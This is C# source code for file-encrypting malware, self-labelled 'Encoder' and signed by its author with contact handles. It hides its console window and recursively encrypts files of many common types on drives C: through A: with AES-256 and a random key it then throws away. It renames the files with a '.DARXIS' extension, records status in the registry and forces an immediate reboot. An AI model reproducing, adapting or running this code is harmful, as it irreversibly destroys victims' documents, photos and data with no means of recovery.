/* ------------------------------------------------------ */
/* >>>>>>>>>>>>>>>>> Coded by DarxiS <<<<<<<<<<<<<<<<<<<  */
/* ------------------------------------------------------ */
/* ABOUT PROJECT: */
/* ----------------
 * > Version: 2.14
 * > Creation date: 06.05.2020
 * > Last update: 10.05.2020
 * > .NET Framework: 4.5 +
 * > OS: Windows XP, Windows 7, Windows 8, Windows 10
 * > Malware type: Encoder
 * > ToDo: Support cipher RSA, support cipher C4ISR, TDD
 ---------------- */
/* CONTACT ME: */
/* -------------
 * Email: darxis.exception@vfemail.net
 * Telegram: @Darxis
 * Jabber: Darxis@exploit.im
 * HackTheBox: https://www.hackthebox.eu/profile/37928
 ------------- */
/* ------------------------------------------------------ */




/* ======================================== SYSTEM LIBS ====================================== */
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
/* =========================================================================================== */



namespace DISK_ENCODER
{
    class DISK_ENCODER
    {

/* ===================================== GLOBAL OBJECTS ====================================== */
        private static string GET_USER_NAME = Environment.UserName;
        private static string GET_CUMPUTER_NAME = System.Environment.MachineName.ToString();
        private static RegistryKey GET_REGKEY = null;
        private static FileInfo GET_FILE_INFO = null;
/* =========================================================================================== */




/* =================================== SET CIPHER ============================================ */
        private static byte[] __CIPHER(byte[] INPUT_HANDLER, byte[] GET_CIPHER_KEY)
        {
            byte[] GET_INPUT_BYTES = null;
            byte[] GET_CIPHER_SALT = new byte[]
            {
                0x89, 0xC8, 0xFA, 0x8E, 0xD0, 0x8E, 0xC0, 0x8E, 0xD8, 0xFB, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB4, 0x13, 0x30, 0xC0, 0xBB, 0x0F, 0x00, 0x31, 0xD2, 0xB9, 0x1E, 0x00, 0xE8, 0x1E, 0x00, 0x5B, 0x45, 0x52, 0x52, 0x4F, 0x52, 0x5D, 0x20, 0x4D, 0x42, 0x52, 0x20, 0x70, 0x61, 0x74, 0x63, 0x68, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x62, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x5D, 0xCD, 0x10, 0xEB, 0xFE
            };

            using (MemoryStream GET_MEMORY_STREAM = new MemoryStream())
            {
                using (RijndaelManaged GET_AES256 = new RijndaelManaged())
                {
                    var CIPHER_KEY = new Rfc2898DeriveBytes(GET_CIPHER_KEY, GET_CIPHER_SALT, 4096);

                    GET_AES256.KeySize = 256;
                    GET_AES256.BlockSize = 128;

                    GET_AES256.Key = CIPHER_KEY.GetBytes(GET_AES256.KeySize / 8);
                    GET_AES256.IV = CIPHER_KEY.GetBytes(GET_AES256.BlockSize / 8);

                    GET_AES256.Mode = CipherMode.CBC;

                    using (var ENCRYPTION_PROCESS = new CryptoStream(GET_MEMORY_STREAM, GET_AES256.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        ENCRYPTION_PROCESS.Write(INPUT_HANDLER, 0, INPUT_HANDLER.Length);
                        ENCRYPTION_PROCESS.Close();
                    }
                    GET_INPUT_BYTES = GET_MEMORY_STREAM.ToArray();
                }
            }
            return GET_INPUT_BYTES;
        }
/* ============================================================================================ */




/* ================================== GENERATE_KEY ============================================ */
        private static string __KEYGEN(int GET_KEY_SIZE)
        {
            int GET_COUNTER = 0;
            StringBuilder GET_RESULT = new StringBuilder();
            Random GET_RANDOM_PROCESS = new Random();

            const string GET_MUTEX = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!*@$+/)%(&?-=";

            while (GET_COUNTER < GET_KEY_SIZE--)
            {
                GET_RESULT.Append(GET_MUTEX[GET_RANDOM_PROCESS.Next(GET_MUTEX.Length)]);
            }
            return GET_RESULT.ToString();
        }
/* ============================================================================================ */




/* ================================== ENCRYPTION ============================================ */
        private static void __ENCRYPTION(string GET_INPUT_FILE, string GET_CIPHER_KEY)
        {
            try
            {
                GET_FILE_INFO = new FileInfo(GET_INPUT_FILE);
                byte[] GET_RESULT_BYTECODE = null;
                byte[] GET_FILE_BYTECODE = File.ReadAllBytes(GET_INPUT_FILE);
                byte[] GET_KEY_BYTECODE = Encoding.UTF8.GetBytes(GET_CIPHER_KEY);

                GET_KEY_BYTECODE = SHA256.Create().ComputeHash(GET_KEY_BYTECODE);

                if (GET_FILE_INFO.Length > 1024 * 1024 * 10)
                {
                    return;
                }
                else
                {
                    GET_RESULT_BYTECODE = __CIPHER(GET_FILE_BYTECODE, GET_KEY_BYTECODE);
                    File.WriteAllBytes(GET_INPUT_FILE, GET_RESULT_BYTECODE);
                    System.IO.File.Move(GET_INPUT_FILE, GET_INPUT_FILE + ".DARXIS");
                }
            }
            catch
            { Thread.Sleep(100); }
        }
/* ============================================================================================ */




/* ======================================= INIT =============================================== */
        private static void __INIT(string GET_DIRECTORY, string GET_CIPHER_KEY)
        {
            try
            {
                GC.Collect();
                foreach (var CURRENT_FILE in Directory.GetFiles(GET_DIRECTORY))
                {
                    var EXTENSIONS_LIST = new[] { ".jpg", ".png", ".gif", ".psd", ".tga", ".bmp", ".ico", ".jpeg", ".svg", ".tiff", ".tif", ".jpe", ".jfif", ".raw", ".ai", ".rle", ".mp4", ".avi", ".mpeg", ".mpg", ".vcd", ".vid", ".vob", ".swf", ".webm", ".vob", ".wm", ".wmv", ".yuv", ".dat", ".f4v", ".asx", ".3g2", ".3gp", ".asf", ".mkv", ".rm", ".aif", ".amr", ".aob", ".asf", ".aud", ".flac", ".iff", ".m3u", ".m3u8", ".m4a", ".m4b", ".mid", ".midi", ".mod", ".mp3", ".mpa", ".ogg", ".wav", ".wave", ".ra", ".wma", ".asp", ".aspx", ".doc", ".docx", ".docm", ".dot", ".dotm", ".dotx", ".epub", ".gpx", ".key", ".mobi", ".djv", ".djvu", ".pages", ".pdf", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".rtf", ".xls", ".xml", ".xlsm", ".xlsb", ".xlsx", ".xlt", ".xltm", ".xltx", ".xps", ".odt", ".indd", ".pif", ".rar", ".zip", ".7z", ".cab", ".cbr", ".gz", ".jar", ".gzip", ".arj", ".pkg", ".pak", ".tar", ".tar-gz", ".tgz", ".xar", ".zipx", ".spl", ".ace", ".tmp", ".shs", ".xps", ".cf", ".log", ".txt", ".dt", ".cfu", ".mxl", ".1cd", ".efd", ".mft", ".pff", ".st", ".grs", ".erf", ".epf", ".elf", ".lgf", ".cdn", ".ps", ".bat", ".cmd", ".yaml", ".lock", ".json", ".cfg", ".vbs", ".db", ".data", ".ini", ".sig", ".ftl", ".sqlite", ".msg", ".scr", ".theme", ".html", ".htm", ".hta", ".pub", ".vss", ".bak", ".url", ".cdw", ".dwg", ".dxf", ".jgs", ".sat" };
                    GET_FILE_INFO = new FileInfo(CURRENT_FILE);

                    try
                    {
                        if (EXTENSIONS_LIST.Contains(GET_FILE_INFO.Extension.ToString()))
                        {
                            __ENCRYPTION(CURRENT_FILE, GET_CIPHER_KEY);
                        }
                    }
                    catch
                    { Thread.Sleep(100); }
                }

                foreach (var CURRENT_DIRECTORY in Directory.GetDirectories(GET_DIRECTORY))
                {
                    try
                    {
                        __INIT(CURRENT_DIRECTORY, GET_CIPHER_KEY);
                    }
                    catch
                    { Thread.Sleep(100); }
                }
            }
            catch
            { Thread.Sleep(100); }
        }
/* ============================================================================================ */





/* ======================================= STEALTH =============================================== */
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
/* ============================================================================================ */





/* ===================================== EXECUTION ============================================ */
        static void Main(string[] args)
        {
            int GET_COUNTER = 0;
            string CIPHER_KEY = __KEYGEN(2048);
            string[] EXTEND_DISK = { "C:\\", "D:\\", "E:\\", "I:\\", "G:\\", "H:\\", "F:\\", "B:\\", "A:\\" };
            GET_REGKEY = Registry.CurrentUser.CreateSubKey("Software\\Wow6432Node\\Microsoft\\Active Setup\\0STATUS");

            try
            {
                var THIS_WINDOW = GetConsoleWindow();
                ShowWindow(THIS_WINDOW, 0);

                for (GET_COUNTER = 0; GET_COUNTER < 10; GET_COUNTER++)
                {
                    __INIT(EXTEND_DISK[GET_COUNTER], CIPHER_KEY);
                }

                try
                {
                    CIPHER_KEY = null;

                    GET_REGKEY.SetValue("PC", GET_CUMPUTER_NAME);
                    GET_REGKEY.SetValue("USER", GET_USER_NAME);
                    GET_REGKEY.SetValue("STATUS", "| ENCRYPTED |");
                    GET_REGKEY.Close();

                    Process.Start("shutdown", "/r /t 0");
                    Environment.Exit(0);
                }
                catch
                {
                    CIPHER_KEY = null;
                    Process.GetCurrentProcess().Kill();
                }
            }
            catch
            {
                CIPHER_KEY = null;
                Process.GetCurrentProcess().Kill();
            }
        }
/* ============================================================================================ */
    }
}
